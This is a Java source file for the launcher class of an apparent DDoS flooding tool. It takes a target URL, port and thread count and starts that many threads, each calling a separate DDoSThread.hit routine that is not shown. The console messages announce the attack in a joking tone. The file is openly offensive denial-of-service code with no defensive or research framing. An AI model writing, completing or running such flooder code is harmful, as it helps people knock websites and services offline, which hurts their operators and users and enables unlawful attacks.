package main;

import java.util.concurrent.Executors;

public class DDoS
{
	public DDoS()
	{
		Chocolat.println("[Flooder] DDoS-chan subsystem ready! At your service Sempai!");
	}
	
	public void run(String url, int port, int threads)
	{
		Chocolat.println("Beginning attack with " + threads + " threads.");
		for (int yiffff = 0; yiffff < threads; yiffff++)
		{
			 Chocolat.print("[Flooder] Threads: " + threads);
			 Executors.newSingleThreadExecutor().execute(new Runnable() {
	     		    @SuppressWarnings("static-access")
					@Override
	     		    public void run() {
	     		    	try {
	     		    		DDoSThread sk = new DDoSThread();
	     		    		sk.hit(url, port);
	     				} catch (Exception e) {
	     					// TODO Auto-generated catch block
	     					e.printStackTrace();
	     				}
	     		    }
	     		});   	 
		}
	}
}
